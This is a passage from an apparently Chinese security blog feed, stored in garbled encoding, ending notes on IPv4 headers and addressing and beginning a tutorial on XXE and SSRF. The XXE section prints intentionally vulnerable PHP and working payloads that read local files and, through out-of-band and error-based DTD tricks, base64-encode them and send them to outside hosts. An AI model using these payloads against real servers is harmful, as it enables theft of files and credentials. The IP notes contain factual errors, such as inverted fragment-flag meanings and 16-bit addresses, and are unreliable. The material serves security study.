<p>  è‹¥ç›®æ ‡ä¸»æœºæœªä¸æœ¬åœ°è·¯ç”±å™¨ç›´æ¥ç›¸è¿ï¼Œè·¯ç”±å™¨é€šè¿‡æŸ¥æ‰¾è·¯ç”±è¡¨ï¼Œå¹¶å°†æ•°æ®åŒ…è½¬äº¤ç»™è·¯ç”±è¡¨ä¸­æŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ã€‚è‹¥è·¯ç”±è¡¨ä¸­æœ‰åˆ°è¾¾ç›®æ ‡ç½‘ç»œçš„è·¯ç”±ï¼Œåˆ™å§æ•°æ®åŒ…ä¼ é€ç»™æŒ‡æ˜çš„å“ä¸€è·³è·¯ç”±å™¨ï¼Œå¦‚æœæ²¡æœ‰è·¯ç”±ï¼Œåˆ™å°†æ•°æ®åŒ…ä¼ é€ç»™è·¯ç”±è¡¨ä¸­çš„é»˜è®¤è·¯ç”±ã€‚å¦‚æœä¸¤è€…éƒ½æ²¡æœ‰åˆ™ä¸¢å¼ƒæ•°æ®åŒ…å¹¶æŠ¥å‘Šé”™è¯¯</p>
</li>
</ul>
<h3 id="IPåˆ†ç‰‡"><a href="#IPåˆ†ç‰‡" class="headerlink" title="IPåˆ†ç‰‡"></a>IPåˆ†ç‰‡</h3><p>å½“è·¯ç”±å™¨åœ¨è½¬å‘IPæ•°æ®åŒ…æ˜¯ï¼Œå¦‚æœåŒ…çš„å¤§å°å¤§äºå½“å‰é“¾è·¯çš„MTUï¼Œè·¯ç”±å™¨åˆ™ä¼šå°†è¯¥IPåˆ†ç»„åˆ†èŠ‚æˆæ»¡è¶³MTUçš„æ•°æ®åŒ…ï¼Œè¿›è¡Œä¼ è¾“ï¼Œå¹¶åœ¨åˆ°è¾¾ç›®æ ‡ä¸»æœºæ—¶æ‰è¢«è¿›è¡Œé‡ç»„ã€‚</p>
<h3 id="IPåˆ†ç»„ç»“æ„"><a href="#IPåˆ†ç»„ç»“æ„" class="headerlink" title="IPåˆ†ç»„ç»“æ„"></a>IPåˆ†ç»„ç»“æ„</h3><p>ç”±é¦–éƒ¨ä¸æ•°æ®é‡éƒ¨åˆ†ç»„æˆï¼Œé¦–éƒ¨åŒ…å¥½20å­—èŠ‚çš„å›ºå®šéƒ¨åˆ†ä»¥åŠå¯é€‰éƒ¨åˆ†</p>
<h2 id="IPæŠ¥æ–‡é¦–éƒ¨"><a href="#IPæŠ¥æ–‡é¦–éƒ¨" class="headerlink" title="IPæŠ¥æ–‡é¦–éƒ¨"></a>IPæŠ¥æ–‡é¦–éƒ¨</h2><p>IP Versionâ€”â€”â€”IPç‰ˆæœ¬å·ï¼Œ4bits,ipv4-0100ã€ipv6-0110</p>
<p>Hdr Lenâ€”â€”â€”å¤´éƒ¨é•¿åº¦ï¼Œ4bitsã€‚ä¸€ä¸ªä½è¡¨ç¤º4ä¸ªå­—èŠ‚ï¼Œå³æœ€å¤§å¯ä»¥è¡¨ç¤º60ä¸ªå­—èŠ‚é•¿åº¦ï¼Œä¸€èˆ¬ä¸º0101&#x3D;0d5,å³20ä¸ªå­—èŠ‚ã€‚</p>
<p>Type of Service(QOSã€TOS)â€”â€”ä¼˜å…ˆçº§åŠæœåŠ¡ç±»å‹ï¼Œ8bitsï¼Œå‰ä¸‰ä½ä¸ºä¼˜å…ˆçº§ï¼Œä¸­é—´3ä½ä¸ºæœåŠ¡ç±»å‹,D:ä½å»¶æ—¶ï¼ŒTé«˜ååé‡ï¼ŒRé«˜ç¨³å®šæ€§ï¼Œåä¸¤ä½ä¸ºECNã€‚QOS:æä¾›äº†8ç§æœåŠ¡ä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§è¶Šé«˜çš„æŠ¥æ–‡å°†è¢«ä¼˜å…ˆå¤„ç†ã€‚TOS:æä¾›äº†ä¸‰ç§ä¸åŒçš„æœåŠ¡ç±»å‹ï¼Œåˆ†åˆ«ä¸ºD-ä½æ—¶å»¶ï¼ŒT-é«˜ååé‡ï¼ŒR-é«˜å¯é æ€§ã€‚ECN:å½“ä¸€ä¸ªå¸¦æœ‰ECNæ ‡å¿—çš„åˆ†ç»„è¢«å‘é€åï¼Œå¦‚æœæ¥æ”¶ç«¯â€œâ€æŒç»­æ‹¥å¡ä¸”å…·æœ‰â€œæ„ŸçŸ¥ECNâ€çš„èƒ½åŠ›ï¼Œé‚£ä¹ˆæ¥æ”¶ç«¯ä¼šé€šçŸ¥å‘é€ç«¯é™ä½å‘é€é€Ÿåº¦ã€‚</p>
<p>Total Lengthâ€”â€”â€”æ€»é•¿åº¦ï¼Œ16bitsï¼Œå•ä½ï¼šå­—èŠ‚ï¼Œé¦–éƒ¨ä¸æ•°æ®éƒ¨åˆ†ä¹‹å’Œçš„é•¿åº¦ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œæ•…æ•°æ®æŠ¥çš„æœ€å¤§é•¿åº¦ä¸º65535ä¸ªå­—èŠ‚ï¼Œä½†å—MTUçš„é™åˆ¶ï¼Œæ­¤å€¼åªæ˜¯ç†è®ºä¸Šçš„å€¼ã€‚</p>
<p>Indentification(Fragment ID)-æ ‡ç¤ºï¼Œ16bitsï¼Œä¸ºç‰‡åˆ†ç±»ï¼Œæ•°æ®åœ¨æ•°æ®é“¾è·¯å±‚ä¼šè¿›è¡Œåˆ†ç‰‡æ“ä½œï¼Œæ­¤æ ‡å¿—è¡¨ç¤ºè¯¥åˆ†ç‰‡å±äºæŸä¸€å¸§ã€‚</p>
<p>Râ€”â€”1bit ä¿ç•™</p>
<p>DFâ€”â€”1bitï¼ŒDo not Fragment ,æ˜¯å¦åˆ†ç‰‡,1è¡¨ç¤ºæœªåˆ†ç‰‡ï¼Œ0è¡¨ç¤ºå·²åˆ†ç‰‡</p>
<p>MFâ€”â€”1bitï¼ŒMore Fragmentï¼Œæ˜¯å¦æœ€åä¸€ç‰‡ï¼Œ0è¡¨ç¤ºæ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡ï¼Œ1è¡¨ç¤ºä¸æ˜¯</p>
<p>Fragment Offsetâ€”â€”ï¼Œ13bitsï¼Œç‰‡åç§»ï¼Œåä¸€ä¸ªç‰‡ä»å‰ä¸€ä¸ªç‰‡çš„å“ªä¸ªä½ç½®å¼€å§‹æ‹¼æ¥ï¼Œå•ä½ä¸ºï¼š8Bytes</p>
<p>Time To Live(TTl)â€”â€”8bitsï¼Œæœ€å¤§ç”Ÿå­˜æ—¶é—´ï¼Œæ•°æ®å¸§æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨è¯¥å€¼å°±å‡1ï¼Œå½“è¯¥å€¼ä¸ºé›¶æ—¶ï¼Œæ•°æ®å°†è¢«ä¸¢å¼ƒï¼Œä¸¢å¼ƒçš„ç½‘ç»œè®¾å¤‡å°†ç»™å‘é€æ–¹å›åŒ…ã€‚é˜²æ­¢æ•°æ®åœ¨ç½‘ç»œä¸Šæ— é™å¾ªç¯ã€‚linuxä¸€èˆ¬å°äº100ï¼Œwindowsä¸€èˆ¬å¤§äº128ã€‚</p>
<p>Protocolâ€”â€”â€”8bitsï¼Œåè®®å·ï¼šTCP-6ï¼ŒUDP-17,IP-0x0800,ARP-0x0860</p>
<p>Header Checksumâ€”â€”-16bitsï¼Œé¦–éƒ¨æ ¡éªŒå’Œ</p>
<p>Source IP Addressâ€”â€”16bitsï¼ŒæºIPåœ°å€</p>
<p>Destination IP Addressâ€”â€”-16bitsï¼Œç›®çš„IPåœ°å€</p>
<p>Optionsâ€”â€”â€”40Bytesï¼Œå¯é€‰é¡¹ï¼šä¸€èˆ¬ä¸€äº›ç‰¹æ®Šçš„è¦æ±‚ä¼šåŠ åœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼šæ¾æ•£è·¯ç”±ï¼Œä¸¥æ ¼è·¯ç”±ï¼Œè·¯ç”±è®°å½•ï¼Œæ—¶é—´æˆ³ã€‚</p>
<p>Dataâ€”â€”â€”æ•°æ®éƒ¨åˆ†</p>
<p><img src="/archives/eecf3b2/20200807132831372.png"></p>
<h3 id="IPæŠ¥å¤´ä¸¾ä¾‹ï¼š"><a href="#IPæŠ¥å¤´ä¸¾ä¾‹ï¼š" class="headerlink" title="IPæŠ¥å¤´ä¸¾ä¾‹ï¼š"></a>IPæŠ¥å¤´ä¸¾ä¾‹ï¼š</h3><p>0100 0101 00000000 0000000000101000 1100000101111010 010 0000000000000 01000000 00000110 0000001000000101 11000000 10101000 00000011 00000111 11001010 01011001 11101001 01000111</p>
<ul>
<li>1-4bitï¼š0100â€”â€”IPv4</li>
<li>5-8bitï¼š0101â€”â€”é¦–éƒ¨é•¿åº¦ä¸º20å­—èŠ‚</li>
<li>9-16bitï¼š00000000â€”â€”â€”æœåŠ¡ç±»å‹ä¸ä¼˜å…ˆçº§</li>
<li>17-32bitï¼š0000000000101000 â€”â€”æ•´ä¸ªIPåŒ…çš„é•¿åº¦ï¼Œ40å­—èŠ‚</li>
<li>33-48bitï¼š1100000101111010â€”â€”-49530ï¼Œç‰‡æ ‡è¯†</li>
<li>49-51bitï¼š010 â€”â€”â€”ç¬¬ä¸€ä½ä¿ç•™ï¼Œæœªåˆ†ç‰‡ï¼Œæ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡</li>
<li>52-64bitï¼š0000000000000â€”â€”â€”æœªæ›¾åˆ†ç‰‡ï¼Œæ•…æ— åç§»</li>
<li>65-72bitï¼š01000000â€”â€”â€”64ï¼Œç”Ÿå­˜æ—¶é—´</li>
<li>73-80bit ï¼š00000110â€”â€”â€”6ï¼ŒTCPåè®®</li>
<li>81-96bit ï¼š0000001000000101 â€”â€”â€”517ï¼Œé¦–éƒ¨æ ¡éªŒå’Œ</li>
<li>97-128bit ï¼š11000000 10101000 00000011 00000111â€”â€”-192.168.3.7 æºIPåœ°å€</li>
<li>129-160bit ï¼š 11001010 01011001 11101001 01000111â€”â€”â€”202.89.233.71 ç›®æ ‡IPåœ°å€</li>
</ul>
<p><img src="/archives/eecf3b2/20200807134300500.png"></p>
<h2 id="IPv4åœ°å€"><a href="#IPv4åœ°å€" class="headerlink" title="IPv4åœ°å€"></a>IPv4åœ°å€</h2><h3 id="IPåœ°å€æ„æˆ"><a href="#IPåœ°å€æ„æˆ" class="headerlink" title="IPåœ°å€æ„æˆ"></a>IPåœ°å€æ„æˆ</h3><p>IPv4åœ°å€ç”±32ä½äºŒè¿›åˆ¶ç»„æˆï¼Œæ¯8ä½åˆ’åˆ†ä¸º1ç»„ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶è¡¨ç¤ºä¸ºxxx.xxx.xxx.xxxï¼Œè¿™ç§è¡¨ç¤ºæ–¹æ³•è¢«ç§°ä¸ºç‚¹åˆ†åè¿›åˆ¶</p>
<p>IPv6åœ°å€ç”±128ä½äºŒè¿›åˆ¶ç»„æˆï¼Œæ¯16ä½åˆ’åˆ†ä¸ºä¸€ç»„ï¼Œæ¯ä¸€ç»„å†…æ¯4ä½æœ‰ä¸€ä¸ª16è¿›åˆ¶æ•°è¡¨ç¤º</p>
<h3 id="IPv4åœ°å€åˆ†ç±»ï¼š"><a href="#IPv4åœ°å€åˆ†ç±»ï¼š" class="headerlink" title="IPv4åœ°å€åˆ†ç±»ï¼š"></a>IPv4åœ°å€åˆ†ç±»ï¼š</h3><p>Aç±»ï¼š0~127ï¼ŒäºŒè¿›åˆ¶ç¬¬ä¸€ä½ä¸º0ï¼Œå³0xxxxxxxx</p>
<p>Bç±»ï¼š128~191ï¼ŒäºŒè¿›åˆ¶ç¬¬ä¸€ä½ä¸º1,ç¬¬äºŒä½ä¸º0ï¼Œå³10xxxxxx</p>
<p>Cç±»ï¼š192~223ï¼ŒäºŒè¿›åˆ¶ç¬¬ä¸€ä½ä¸º1ï¼Œç¬¬äºŒä½ä¸º1ï¼Œç¬¬ä¸‰ä½ä¸º0ï¼Œå³110xxxxx</p>
<p>Dç±»ï¼š224~239,äºŒè¿›åˆ¶ç¬¬ä¸€ä½ä¸º1ï¼Œç¬¬äºŒä½ä¸º1ï¼Œç¬¬ä¸‰ä½ä¸º1ï¼Œç¬¬å››ä½ä¸º0ï¼Œå³1110xxxxï¼Œç»„æ’­åœ°å€</p>
<p>Eç±»ï¼š240~255ï¼ŒäºŒè¿›åˆ¶ç¬¬ä¸€ä½ä¸º1ï¼Œç¬¬äºŒä½ä¸º1ï¼Œç¬¬ä¸‰ä½ä¸º1ï¼Œç¬¬å››ä½ä¸º1ï¼Œå³1111xxxx</p>
<p><em><strong>å¦‚ä½•è·å–ä¸€ä¸ªIPåœ°å€çš„å­ç½‘æ ‡è¯†ï¼Ÿ</strong></em></p>
<p>å°†è¯¥IPåœ°å€ä¸å…¶å­ç½‘æ©ç è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—å³å¾—åˆ°å…¶å­ç½‘åœ°å€</p>
<p><em><strong>å¦‚ä½•è·å–ä¸€ä¸ªIPåœ°å€çš„å¹¿æ’­åœ°å€ï¼Ÿ</strong></em></p>
<p>å°†è¯¥IPåœ°å€çš„å­ç½‘æ©ç æŒ‰ä½å–åä¹‹åå†ä¸è¯¥IPè¿›è¡ŒæŒ‰ä½æˆ–æ“ä½œå³å¯ã€‚</p>
<h3 id="ç‰¹æ®ŠIPv4åœ°å€"><a href="#ç‰¹æ®ŠIPv4åœ°å€" class="headerlink" title="ç‰¹æ®ŠIPv4åœ°å€"></a>ç‰¹æ®ŠIPv4åœ°å€</h3><ul>
<li>127.0.0.0&#x2F;8ï¼šå›ç¯åœ°å€ï¼Œè¡¨ç¤ºè¯¥è®¾å¤‡æœ¬èº«</li>
<li>å½“ä¸»æœºå·ä¸º0æ—¶è¡¨ç¤ºè¯¥ç½‘ç»œæœ¬èº«ï¼Œå³è¯¥ç½‘ç»œé‡Œçš„ç¬¬ä¸€ä¸ªåœ°å€ï¼šå¦‚ï¼Œ192.168.2.0&#x2F;255.255.255.0</li>
<li>å½“ä¸»æœºå·ä¸º255æ—¶è¡¨ç¤ºè¯¥ç½‘ç»œçš„å¹¿æ’­åœ°å€ï¼Œå³è¯¥ç½‘ç»œçš„æœ€åä¸€ä¸ªåœ°å€</li>
<li>255.255.255.255 ä¸ºæ•´ä¸ªäº’è”ç½‘çš„å¹¿æ’­åœ°å€</li>
</ul>
<h3 id="IPv4åœ°å€è€—å°½è§£å†³æ–¹æ¡ˆ"><a href="#IPv4åœ°å€è€—å°½è§£å†³æ–¹æ¡ˆ" class="headerlink" title="IPv4åœ°å€è€—å°½è§£å†³æ–¹æ¡ˆ"></a>IPv4åœ°å€è€—å°½è§£å†³æ–¹æ¡ˆ</h3><p>ä¼ ç»Ÿçš„IPv4åœ°å€è¢«è®¤ä¸ºçš„åˆ’åˆ†ä¸ºä¸å®¹çš„ç§ç±»ï¼Œå…¶ç½‘ç»œå·è¢«é™å®šåœ¨8ã€16ã€24ä½ï¼Œæ–°çš„è§£å†³æ–¹æ¡ˆçªç ´äº†è¿™ä¸ªé™åˆ¶é€šè¿‡å‰ç¼€æ¥é™å®šä¸åŒçš„ç½‘ç»œï¼Œä¹Ÿå°±æ²¡æœ‰äº†åœ°å€åˆ†ç±»è¿™ç§è¯´æ³•ï¼Œæ‰©å¤§äº†IPåœ°å€çš„å¯åˆ©ç”¨ç‡ã€‚å¦‚ï¼š10.0.0.1&#x2F;18ï¼Œå…¶ä¸­çš„18è¡¨ç¤ºè¯¥IPåœ°å€ä¸­å‰18ä½è¡¨ç¤ºäº†ç½‘ç»œå·ï¼Œå12ä½è¡¨ç¤ºä¸»æœºå·ã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>TCP</tag>
        <tag>UDP</tag>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEä¸SSRF</title>
    <url>/archives/4e6e7714.html</url>
    <content><![CDATA[<h1 id="XXE-and-SSRF"><a href="#XXE-and-SSRF" class="headerlink" title="XXE and SSRF"></a>XXE and SSRF</h1><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE-å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"><a href="#XXE-å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´" class="headerlink" title="XXE - å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´"></a>XXE - å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</h2><p>åˆ©ç”¨äº†ç½‘ç«™åœ¨è§£æxmlæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥å¼•å…¥å¤–éƒ¨å®ä½“çš„ç‰¹æ€§ï¼Œè€Œå¤–éƒ¨å®ä½“å¯ä»¥ä½¿ç”¨å„ç§åè®®å¦‚ï¼Œphp:&#x2F;&#x2F;filter ftp http fileï¼Œç­‰æ–¹å¼è·å¾—æœ¬åœ°çš„ï¼Œç½‘ç»œçš„èµ„æºï¼Œä»è€Œä½¿æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„dtdæ–‡ä»¶ä¸­çš„payloadå¾—ä»¥æ‰§è¡Œã€‚</p>
<h3 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);    <span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();    <span class="variable">$dom</span> -&gt; <span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_BIGLINES | LIBXML_NOWARNING | LIBXML_NOENT | LIBXML_DTDLOAD);    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);    <span class="keyword">echo</span> <span class="variable">$creds</span>  <span class="comment">#æ³¨é‡Šè¿™ä¸€è¡Œçš„è¯å°±æ˜¯æ²¡æœ‰å›æ˜¾çš„xxe?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æœ‰å›æ˜¾çš„XXE"><a href="#æœ‰å›æ˜¾çš„XXE" class="headerlink" title="æœ‰å›æ˜¾çš„XXE"></a>æœ‰å›æ˜¾çš„XXE</h3><p><strong>åˆ¤æ–­æ–¹å¼</strong></p>
<p>ä¿®æ”¹ç½‘é¡µçš„è¯·æ±‚æ–¹å¼ä¸ºpostï¼Œpostçš„æ•°æ®ä¿®æ”¹ä¸ºä»»æ„xmlæ ‡ç­¾ï¼Œå¦‚ï¼šggggg,å¦‚æœgggggæˆåŠŸå†é¡µé¢ä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œåˆ™å­˜åœ¨æœ‰å›æ˜¾çš„XXEæ¼æ´ã€‚</p>
<p><strong>åˆ©ç”¨</strong></p>
<p>æ­¤æ—¶åªéœ€ç›´æ¥æ„é€ å¦‚ä¸‹payloadä¸Šä¼ å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY test SYSTEM &quot;file:///etc/password&quot;&gt;]&gt;&lt;data&gt;&amp;data;&lt;/data&gt;//å¦‚æ­¤ä¾¿å¯è·å–linuxç³»ç»Ÿçš„å¯†ç æ–‡ä»¶ä¸­çš„å†…å®¹</span><br></pre></td></tr></table></figure>

<h3 id="æ— å›æ˜¾çš„XXE"><a href="#æ— å›æ˜¾çš„XXE" class="headerlink" title="æ— å›æ˜¾çš„XXE"></a>æ— å›æ˜¾çš„XXE</h3><p>å³blind oob XXE â€”â€”-oob out of band å¸¦å¤–é€šä¿¡</p>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><strong>å¯ä»¥è®¿é—®å¤–ç½‘æœåŠ¡å™¨çš„DTD</strong></p>
<p>æ„é€ ä¸Šä¼ çš„xmlæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.0.104/ .dtd&quot;&gt;&lt;data&gt;&amp;send;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ å¤–å¸¦çš„dtdæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % win SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C://Windows//system.ini&quot;&gt;&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.248.171:1337/?%win;&#x27;&gt;&quot;&gt;%wrapper;</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°ä»£ç ç”¨åˆ°äº†phpä¸ºåè®®è®²éœ€è¦å¤–å¸¦çš„æ•°æ®è¿›è¡Œbase64ç¼–ç ï¼Œä»¥é¿å…ä¸€äº›æ•æ„Ÿå­—ç¬¦å¼•èµ·çš„é”™è¯¯ã€‚</p>
<p>ä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨å¤–å¸¦dtdå®ä½“</p>
<p>å› ä¸ºå†…éƒ¨å®ä½“ä¸­ä½¿ä¸å…è®¸ä½¿ç”¨å‚æ•°å®ä½“çš„ï¼Œä½†åœ¨å¤–å¸¦å®ä½“ä¸­åˆ™ä¸å—æ­¤é™åˆ¶</p>
<p>ä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨å®ä½“åµŒå¥—</p>
<p>å› ä¸ºåŒçº§çš„å‚æ•°å®ä½“ä¸èƒ½äº’ç›¸è§£æï¼ŒåµŒå¥—çš„ç¬¬äºŒå±‚éœ€è¦å¯¹%è¿›è¡Œè½¬ä¹‰æˆä¸º&amp;#x25ï¼Œä¸ç„¶å¯èƒ½å‡ºç°é—®é¢˜ï¼Œä¸‰å±‚åµŒå¥—åˆ™éœ€å¯¹&amp; % â€œ â€™ç­‰è¿›è¡Œè½¬ä¹‰ã€‚åœ¨å®ä½“çš„ç”³æ˜ä¸­ä¸èƒ½å¼•ç”¨å‚æ•°å®ä½“ï¼Œè¿™ä¸€w3cæ ‡å‡†è¢«xmlè§£æå™¨çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œå¦‚æœä½¿äºŒå±‚åµŒå¥—ï¼Œå¤§éƒ¨åˆ†xmlè§£æå™¨éƒ½èƒ½æˆåŠŸè¯†åˆ«ï¼Œä½†å¦‚æœåœ¨ä¸‰å±‚å‰é€ƒç¦»é‡Œé¢ä½¿ç”¨äº†å¼•ç”¨äº†å‚æ•°å®ä½“ï¼Œé‚£ä¹ˆå¾ˆå¤šxmlè§£æå™¨å°±ä¸èƒ½æˆåŠŸåœ°è¯†åˆ«ï¼Œäºæ˜¯ä¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸ä½¿ç”¨å¤–å¸¦dtdæ¥è¿›è¡Œæ³¨å…¥ï¼Œè€Œåªéœ€ä½¿ç”¨å†…éƒ¨dtdå³å¯ã€‚</p>
<p><code>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œæ™®é€šå®ä½“å¯ä»¥åœ¨DTDä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨XMLä¸­å¼•ç”¨ï¼Œå¯ä»¥åœ¨å£°æ˜å‰å¼•ç”¨ï¼Œè¿˜å¯ä»¥åœ¨å®ä½“å£°æ˜å†…éƒ¨å¼•ç”¨ã€‚</code></p>
<p>åœ¨å†…éƒ¨DTDé›†ä¸­ï¼Œå‚æ•°å®ä½“çš„å¼•ç”¨ä¸èƒ½å­˜åœ¨äºæ ‡è®°çš„å£°æ˜ä¸­ã€‚è¿™å¹¶ä¸é€‚ç”¨äºå¤–éƒ¨çš„å‚æ•°å®ä½“ä¸­ã€‚</p>
<p><strong>ä¸å¯ä»¥è®¿é—®å¤–ç½‘æœåŠ¡å™¨DTD</strong></p>
<p>å¦‚æœå®‰å…¨è¿‡æ»¤è¾ƒä¸ºä¸¥æ ¼ï¼Œå½“å‰è§£æå™¨è¢«ç¦æ­¢äº†è®¿é—®å¤–ç½‘æœåŠ¡å™¨çš„DTDï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ¬åœ°æœåŠ¡å™¨ä¸­é»˜è®¤å­˜åœ¨çš„DTDæ–‡ä»¶ï¼Œé€šè¿‡é‡å†™å…¶ä¸­çš„å®ä½“æ¥æ„é€ æˆ‘ä»¬éœ€è¦çš„å®ä½“ã€‚</p>
<p>å†unbantuä¸­å°±å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶ï¼š&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    &lt;!ENTITY % ISOamso &#x27; //æ­¤ä¸ºé¢„ç½®çš„å®ä½“        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#x27;&gt;    %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<h2 id="åŸºäºæŠ¥é”™çš„BLIND-XXE"><a href="#åŸºäºæŠ¥é”™çš„BLIND-XXE" class="headerlink" title="åŸºäºæŠ¥é”™çš„BLIND XXE"></a>åŸºäºæŠ¥é”™çš„BLIND XXE</h2><p>åŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚ <strong><code>ç±»ä¼¼äºsqliä¸­çš„æŠ¥é”™æ³¨å…¥</code></strong></p>
<p><strong>å¼•å…¥ç½‘ç»œæ–‡ä»¶</strong></p>
<p>xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p>dtdæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start;   ///hhhhhè¿™ä¸ªç›®å½•ä¸å­˜åœ¨ï¼Œäºæ˜¯ä¼šæŠ¥é”™ï¼Œè®²%fileçš„å†…å®¹å›æ˜¾åˆ°æµè§ˆå™¨ã€‚</span><br></pre></td></tr></table></figure>

<p>å¼•ç”¨æœ¬åœ°æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;    &lt;!ENTITY % ISOamso &#x27;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#x27;&gt;    %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>ssrf-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€  sever-side request forgery</p>
<p>æˆå› ï¼šæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšåˆç†çš„é™åˆ¶ä¸è¿‡æ»¤ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶æ¥æ¢æµ‹å†…ç½‘çŠ¶æ€ï¼Œè·å–å†…ç½‘èµ„æºï¼Œè¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæµ‹è¯•å†…ç½‘æˆ–è€…æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚</p>
